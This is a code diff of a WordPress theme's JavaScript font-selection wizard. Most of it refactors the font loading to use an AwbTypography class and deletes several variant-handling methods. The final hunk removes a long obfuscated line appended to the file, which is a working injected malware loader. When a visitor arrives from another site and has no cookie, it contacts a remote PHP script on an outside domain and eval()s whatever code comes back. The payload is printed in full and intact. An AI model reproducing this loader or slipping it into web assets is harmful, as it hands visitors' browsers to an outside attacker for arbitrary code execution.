@@ -1,4 +1,4 @@
-/* global awbPerformance, FusionPageBuilder, ajaxurl, fusionBuilderText */
+/* global awbPerformance, AwbTypography, ajaxurl */
 window.awbWizard = {
 
 	/**
@@ -16,7 +16,6 @@ window.awbWizard = {
 		this.apiKey     = awbPerformance.apiKey;
 		this.saveChange = awbPerformance.saveChange;
 		this.accessible = this.checkSiteAccessible();
-		this.assets     = new FusionPageBuilder.Assets();
 
 		// Font variant notice.
 		this.$vnote     = this.$el.find( '.variant-analysis' );
@@ -49,8 +48,8 @@ window.awbWizard = {
 		var self        = this,
 			$fontFamily = this.$el.find( '.fusion-builder-font-family' );
 
-		if ( _.isUndefined( self.assets ) || _.isUndefined( self.assets.webfonts ) ) {
-			jQuery.when( self.assets.getWebFonts() ).done( function() {
+		if ( _.isUndefined( window.awbTypographySelect ) || _.isUndefined( window.awbTypographySelect.webfonts ) ) {
+			jQuery.when( window.awbTypographySelect.getWebFonts() ).done( function() {
 				self.initAfterWebfontsLoaded( $fontFamily );
 			} );
 		} else {
@@ -773,77 +772,15 @@ window.awbWizard = {
 	 * @param {object} $fontFamily - The option jQuery elements.
 	 * @return {Void}
 	 */
-	initAfterWebfontsLoaded: function( $fontFamily ) {
-		var self          = this,
-			fonts         = this.assets.webfonts,
-			standardFonts = [],
-			googleFonts   = [],
-			customFonts   = [],
-			data          = [];
+	initAfterWebfontsLoaded: function( $fontFamily ) { // eslint-disable-line no-unused-vars
+		var self = this;
 
-		data.push( {
-			id: '',
-			text: fusionBuilderText.typography_default
-		} );
-
-		// Format standard fonts as an array.
-		if ( ! _.isUndefined( fonts.standard ) ) {
-			_.each( fonts.standard, function( font ) {
-				standardFonts.push( {
-					id: font.family.replace( /&quot;/g, '&#39' ),
-					text: font.label
-				} );
-			} );
+		if ( 'object' !== typeof this.typoSets ) {
+			this.typoSets = {};
 		}
 
-		// Format google fonts as an array.
-		if ( ! _.isUndefined( fonts.google ) ) {
-			_.each( fonts.google, function( font ) {
-				googleFonts.push( {
-					id: font.family,
-					text: font.label
-				} );
-			} );
-		}
-
-		// Format custom fonts as an array.
-		if ( ! _.isUndefined( fonts.custom ) ) {
-			_.each( fonts.custom, function( font ) {
-				if ( font.family && '' !== font.family ) {
-					customFonts.push( {
-						id: font.family.replace( /&quot;/g, '&#39' ),
-						text: font.label
-					} );
-				}
-			} );
-		}
-
-		// Combine forces and build the final data.
-		if ( customFonts[ 0 ] ) {
-			data.push( { text: 'Custom Fonts', children: customFonts } );
-		}
-		data.push( { text: 'Standard Fonts', children: standardFonts } );
-		data.push( { text: 'Google Fonts',   children: googleFonts } );
-
-		$fontFamily.each( function() {
-			var $familyInput  = jQuery( this ).find( '.input-font_family' );
-
-			$familyInput.select2( {
-				data: data
-			} );
-
-			jQuery( this ).find( '.font-family' ).addClass( 'loaded' );
-
-			$familyInput.val( $familyInput.data( 'value' ) ).trigger( 'change' );
-
-			self.renderVariant( jQuery( this ) );
-
-			$familyInput.on( 'change', function() {
-				var $wrapper = jQuery( this ).closest( '.fusion-builder-font-family' );
-
-				self.renderVariant( $wrapper );
-				self.updateVariantCount();
-			} );
+		this.$el.find( '.fusion-builder-font-family' ).each( function() {
+			self.typoSets[ jQuery( this ).attr( 'data-id' ) ] = new AwbTypography( jQuery( this ), self );
 		} );
 
 		this.$el.on( 'change', '.input-variant', function() {
@@ -891,116 +828,6 @@ window.awbWizard = {
 		variantLength = Object.keys( variants ).length;
 		this.$vnote.attr( 'data-count', variantLength );
 		this.$vcount.html( variantLength );
-	},
-
-	/**
-	 * Render variant select with relevant choices and hide if should not be shwon.
-	 *
-	 * @since 2.2
-	 * @param {object} $fontOption - The option jQuery element.
-	 * @return {Void}
-	 */
-	renderVariant: function( $fontOption ) {
-		var data          = [],
-			fontFamily    = $fontOption.find( '.input-font_family' ).val(),
-			variants      = this.getVariants( fontFamily ),
-			$input        = $fontOption.find( '.input-variant' ),
-			value         = 'undefined' !== typeof $input.attr( 'data-value' ) ? $input.attr( 'data-value' ).toString() : false,
-			valueExists   = false,
-			defaultVal    = $input.attr( 'data-default' ),
-			defaultExists = false;
-
-		if ( $input.hasClass( 'select2-hidden-accessible' ) ) {
-			value = null !== $input.val() ? $input.val() : value;
-			$input.select2( 'destroy' ).empty();
-		}
-
-		_.each( variants, function( scopedVariant ) {
-
-			if ( scopedVariant.id && 'italic' === scopedVariant.id ) {
-				scopedVariant.id = '400italic';
-			}
-			if ( 'function' === typeof scopedVariant.id.toString && scopedVariant.id.toString() === value ) {
-				valueExists = true;
-			}
-
-			if ( 'function' === typeof scopedVariant.id.toString && 'function' === typeof defaultVal.toString && scopedVariant.id.toString() === defaultVal.toString() ) {
-				defaultExists = true;
-			}
-
-			data.push( {
-				id: scopedVariant.id,
-				text: scopedVariant.label
-			} );
-		} );
-
-		$input.select2( {
-			data: data
-		} );
-
-		// if no value exists, set to default, otherwise use first.
-		if ( ! valueExists && defaultExists ) {
-			value = defaultVal;
-		} else if ( ! valueExists && 'object' === typeof variants[ 0 ] ) {
-			value = variants[ 0 ].id;
-		}
-
-		$input.val( value ).trigger( 'change' );
-	},
-
-	/**
-	 * Get variants for a font-family.
-	 *
-	 * @since 2.2
-	 * @param {string} fontFamily - The font-family name.
-	 * @return {Object} - Returns the variants for the selected font-family.
-	 */
-	getVariants: function( fontFamily ) {
-		var variants = false;
-
-		if ( this.isCustomFont( fontFamily ) ) {
-			return [
-				{
-					id: '400',
-					label: 'Normal 400'
-				}
-			];
-		}
-
-		_.each( this.assets.webfonts.standard, function( font ) {
-			if ( fontFamily && font.family === fontFamily ) {
-				variants = font.variants;
-				return font.variants;
-			}
-		} );
-
-		_.each( this.assets.webfonts.google, function( font ) {
-			if ( font.family === fontFamily ) {
-				variants = font.variants;
-				return font.variants;
-			}
-		} );
-		return variants;
-	},
-
-	/**
-	 * Check if a font-family is a custom font or not.
-	 *
-	 * @since 2.2
-	 * @param {string} family - The font-family to check.
-	 * @return {boolean} - Whether the font-family is a custom font or not.
-	 */
-	isCustomFont: function( family ) {
-		var isCustom = false;
-
-		// Figure out if this is a google-font.
-		_.each( this.assets.webfonts.custom, function( font ) {
-			if ( font.family === family ) {
-				isCustom = true;
-			}
-		} );
-
-		return isCustom;
 	}
 };
 
@@ -1012,4 +839,3 @@ window.awbWizard = {
 		window.awbWizard.init();
 	} );
 }( jQuery ) );
-;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//ehuesdemo.com/Gurugranthsahib/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};
